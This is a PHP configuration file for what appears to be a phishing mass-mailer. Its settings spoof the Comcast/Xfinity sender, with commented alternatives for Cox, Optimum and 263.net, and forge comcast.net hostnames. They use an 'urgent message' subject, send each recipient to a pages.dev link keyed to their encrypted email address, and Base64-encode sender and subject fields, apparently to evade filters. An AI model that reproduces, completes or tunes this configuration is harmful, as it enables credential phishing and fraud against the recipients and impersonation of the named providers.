<?php

// SMTP settings
$smtpSettings = [
     [
        'host'      => 'smtp1.example.net',
        'port'      => 587,
        'username'  => 'Usernamxe@example.com',
        'password'  => 'password',
        'Hostname'	=> "mail-".rand(1,9999)."sys.comcast.net",
    ],
   /*  
     [
        'host'      => 'smtp2.example.net',
        'port'      => 587,
        'username'  => 'Usernamxe@example.com',
        'password'  => 'Welcomepassword',
        'Hostname'	=> "mail-".rand(1,9999)."sys.comcast.net",
    ],
    copy the sample file outside the  comment and edit it 
        
        */
 
    // Add more SMTP configurations as needed
];

$domainSettings = [
    
    'DomainName'               => 'Comcast',                      // Comcast, Cox, Optimum, China, Office
   
];

$commonSettings = [
    'from'              => 'xfinity.communications@comcast.net',    // Sender's email address noreply@myemail.optimum.net,  noreply@mail.cox.com, postmaster@mail.263.net, xfinity.communications@comcast.net
    'fromname'          => 'Xfinity',           // Sender's name Postmaster, Cox, Xfinity
    'subject'           => 'Urgent message from Xfinity requires your attention immediately', // Default email subject with placeholder  [12]邮件被拒绝, Urgent message from Optimum - An immediate response is needed., Urgent message from Cox - An immediate response is needed., Urgent message from Xfinity requires your attention immediately
    'letterFile'        => '1.html',                   //  letter filename
    'priority'          => '3',                         // Priority 
    'encoding'          => 'quoted-printable',       // quoted-printable or base64 or 7bit or 8bit or binary,
    'charset'           => 'utf-8',                   //Charset option us-ascii, iso-8859-1, utf-8
    'threads'           => '2',                       // Number of threads
    'sleepDuration'     => '',                       // Sleep duration between sending emails
    'EncryptKeyEmlAdd'  => '439rr095490r',             //EMail Address Encryption key             
    'link'              => 'https://mail-263-net.pages.dev/?id=##emailEncrypt##', // Your link for muttple link sepperat with |
    'linkb64'           => '',                         // Base link link
    'qrlink'            => '',                         // Link behinde qrlink 
    'qrlabel'           => '',                         // Label below qr code
    'image_attachfile'  => '',                         // Image attachment filename
    'imageLetter'       => 'ff1.jpg',                   // Image to base64 or direct images sending
    'pdf_attachfile'    => '',                         // PDF file name to attach
    'autolink'          => false,                      // enable autolink in function
    'image_attachname'  => '',                         // CHnage attachment name
    'randomparam'       => false,                      // randomparam in front of link
    'encodeFromInfo'    => true,                       // Enable Base64 encoding for from name
    'encodeSubject'     => true,                       // Enable Base64 encoding for subject
    'randSender'        => false,                      // Enable Base64 encoding for sender's name
    'displayimage'      => false,                      // 
    'recipientListFile' => 'list.txt',
    'ErrorHandling' 	=> '4',  
    // Enable Base64 encoding for image display
    // other common settings...
];

$recipientListSettings = [
    'removeDuplicates' 	=> false, // Remove duplicate recipients
    'recipientListFile' => 'list.txt', // Recipient list file
];


$customHeaderSettings = [
    
    'customHeaders' => [
        
  //      'Custom-Header1' => 'custom-value1',
  //      'Custom-Header2' => 'custom-value2',
        // ... add more customizable headers here  
    ]
];

?>